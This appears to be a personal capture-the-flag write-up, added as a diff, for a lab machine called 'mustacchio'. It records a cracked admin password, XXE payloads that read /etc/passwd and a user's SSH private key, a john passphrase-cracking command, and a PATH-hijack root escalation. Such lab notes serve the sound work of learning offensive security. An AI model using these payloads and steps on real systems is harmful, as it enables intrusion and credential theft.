@@ -1,0 +1,49 @@
+user.bak had 
+SQLite format 3
+tableusersusers
+CREATE TABLE users(username text NOT NULL, password text NOT NULL)
+]admin1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
+username => admin
+password from user.bak sha1=>bulldog19
+
+for testing XML injection
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE replace [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>
+<comment>
+  <name>Joe Hamd</name>
+  <author>Joe</author>
+<com>&xxe;</com>
+</comment>
+
+barrie's ssh
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE replace [<!ENTITY xxe SYSTEM 'file:////home/barry/.ssh/id_rsa'>]>
+<comment>
+  <name>Joe Hamd</name>
+  <author>Joe</author>
+<com>&xxe;</com>
+</comment>
+
+using john to crach passphrase
+$ python /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
+$ sudo john id_rsa.hash -wordlist=/home/kali/Downloads/Capture-The-Flag/Password-Lists/rockyou.txt
+
+passphrase => urieljames
+
+we got in!!!
+
+for priv escilation
+SUID HINT
+exploiting path of trail
+
+barry@mustacchio:~$ echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+barry@mustacchio:~$ cd /tmp
+barry@mustacchio:/tmp$ echo "/bin/bash" > tail
+barry@mustacchio:/tmp$ chmod 777 tail
+barry@mustacchio:/tmp$ export PATH=/tmp:$PATH
+barry@mustacchio:/tmp$ cd /home/joe/
+barry@mustacchio:/home/joe$ ./live_log 
+root@mustacchio:/home/joe#
+
+
